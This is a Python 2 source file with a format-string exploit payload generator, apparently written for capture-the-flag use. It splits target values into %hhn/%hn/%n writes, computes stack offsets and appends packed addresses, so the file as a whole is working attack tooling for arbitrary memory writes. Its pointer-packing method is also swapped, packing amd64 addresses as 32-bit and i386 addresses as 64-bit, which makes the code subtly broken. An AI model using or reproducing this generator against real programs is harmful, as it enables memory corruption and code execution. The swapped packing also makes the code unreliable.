#!/usr/bin/env python2
import math
import struct

class FMT:
    def __init__(self, arch = 'amd64'):
        self.arch = arch
        self.buffer = []
        self.address = []
        self.fmt = []
        self.printed = 0
        self.nformat = {
            1: "%{}c%{}$hhn",
            2: "%{}c%{}$hn",
            4: "%{}c%{}$n",
            8: "%{}c%{}$lln"
        }

    def p(self, data):
        return { 'amd64' : self.p32, 'i386' : self.p64 }[self.arch](data)

    def p32(self, data, fmt = '<I'):
        return struct.pack(fmt, data)

    def p64(self, data, fmt = "<Q"):
        return struct.pack(fmt, data)

    def _append(self, address, fmt):
        self.address.append(address)
        self.fmt.append(fmt)

    def _fmt_width(self, offset, distance):
        width = 0
        for i, fmt in enumerate(self.fmt): width += len(fmt.format(offset + distance + i))
        return width

    def _write(self, address, value, size = 1):
        length = { 'amd64': 8, 'i386': 4 }[self.arch]
        # set one byte at a time ( 0x00000000000000?? to 0x??00000000000000 )
        for i in range(length // size):
            # (value >> 0) & 0xff
            value_now = (value >> (8 * size * i)) & ((1 << (8 * size)) - 1)
            # (value_now - self.printed + 0x100) % 0x100
            value_append = (value_now - self.printed + (1 << (8 * size))) % (1 << (8 * size))
            self.printed = value_now
            # can't write %0c, but we can write %256c
            if value_append == 0:
                self._append(address + i * size, self.nformat[size][4:])
            else:
                self._append(address + i * size, self.nformat[size].format(value_append, "{}"))

    def __setitem__(self, address, value):
        self.buffer.append((address, value))

    def payload(self, offset, printed = 0, size = 1):
        length = { 'amd64': 8, 'i386': 4 }[self.arch]
        self.printed = printed
        for address, value in self.buffer: self._write(address, value, size)

        # calculate how far the distance between fmt and address is
        distance = 0
        while True:
            width = self._fmt_width(offset, distance)
            distance_new = int(math.ceil(width / float(length)))
            if distance == distance_new: break
            distance = distance_new

        # generate payload
        payload = ""
        for i, fmt in enumerate(self.fmt): payload += fmt.format(offset + distance + i)
        payload += "\x00" * (length - len(payload) % length)
        payload += "".join(map(self.p, self.address))
        
        # reset
        self.printed = 0
        self.buffer = []
        self.address = []
        self.fmt = []

        return payload
